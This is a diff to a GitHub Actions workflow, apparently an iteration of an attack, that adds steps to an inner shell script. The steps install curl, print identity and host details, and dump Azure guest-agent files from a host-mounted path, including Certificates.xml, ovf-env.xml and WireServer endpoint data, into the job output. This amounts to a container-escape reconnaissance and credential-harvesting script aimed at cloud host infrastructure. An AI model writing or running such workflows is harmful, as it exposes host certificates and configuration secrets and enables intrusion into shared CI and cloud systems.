@@ -1,4 +1,4 @@
-name: HC OIDC Primer v8 - WireServer mTLS + Allocation Direct
+name: HC OIDC Primer v9 - WireServer mTLS Fixed (apk add curl) + XML Dump
 on:
   workflow_dispatch:
   push:
@@ -57,8 +57,28 @@ jobs:
           cat > /tmp/inner.sh << 'INNEREOF'
           #!/bin/sh
           set -x
+          echo "=== INNER: installing curl ==="
+          apk add --no-cache curl 2>&1
+          echo "CURL_VERSION=$(curl --version | head -1)"
+
           echo "=== INNER: id/hostname ==="
           id; hostname; uname -a
+
+          echo "=== CACHED WAAGENT XML FILES ==="
+          echo "--- GoalState.1.xml ---"
+          cat /host/var/lib/waagent/GoalState.1.xml 2>/dev/null || echo "GoalState.1.xml not readable"
+          echo "--- SharedConfig.xml ---"
+          cat /host/var/lib/waagent/SharedConfig.xml 2>/dev/null || echo "SharedConfig.xml not readable"
+          echo "--- Certificates.xml ---"
+          cat /host/var/lib/waagent/Certificates.xml 2>/dev/null || echo "Certificates.xml not readable"
+          echo "--- ovf-env.xml ---"
+          cat /host/var/lib/waagent/ovf-env.xml 2>/dev/null || echo "ovf-env.xml not readable"
+          echo "--- WireServerEndpoint ---"
+          cat /host/var/lib/waagent/WireServerEndpoint 2>/dev/null || echo "WireServerEndpoint not readable"
+          echo "--- fast_track.json ---"
+          cat /host/var/lib/waagent/fast_track.json 2>/dev/null || echo "fast_track.json not readable"
+          echo "--- Protocol ---"
+          cat /host/var/lib/waagent/Protocol 2>/dev/null || echo "Protocol not readable"
 
           echo "=== WAAGENT CERTS ==="
           ls -la /host/var/lib/waagent/ 2>/dev/null | head -30
